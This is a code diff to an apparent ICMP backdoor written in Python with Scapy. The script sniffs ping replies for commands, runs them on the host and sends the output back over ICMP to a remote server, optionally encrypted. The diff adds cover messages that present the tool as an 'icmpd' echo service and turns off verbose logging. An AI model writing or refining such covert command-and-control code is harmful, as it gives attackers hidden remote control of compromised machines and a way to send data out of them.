@@ -32,7 +32,8 @@ def send_over_icmp(server, response, SSM, execute):
     if SSM: response = encrypt_decrypt(response)
     serverresponse = header + response
     evil = IP(dst=server)/ICMP(type=8)/(serverresponse)
-    send(evil, verbose=True)
+    print("Reply sent.")
+    send(evil, verbose=False)
 
 # TODO Add error sending
 # Executes command and sends output
@@ -50,6 +51,7 @@ def reply(src, command, SSM):
 
 # Handles the icmp packets
 def handle(pkt):
+    print("Echo received.")
     execute = False
     SSM = False
     src = pkt[IP].dst
@@ -79,8 +81,16 @@ def handle(pkt):
 
         if execute: execute_command(src, command, SSM)
         else: reply(src, command, SSM)
-try:
-    sniff(filter="icmp[icmptype] == icmp-echoreply", prn=handle)
-except KeyboardInterrupt:
-    pass
+
+def main():
+    print("Starting icmpd service...")
+    print("Echo service started...")
+    print("Reply service started...")
+    try:
+        sniff(filter="icmp[icmptype] == icmp-echoreply", prn=handle)
+    except KeyboardInterrupt:
+        pass
+
+if __name__ == "__main__":
+    main()
 
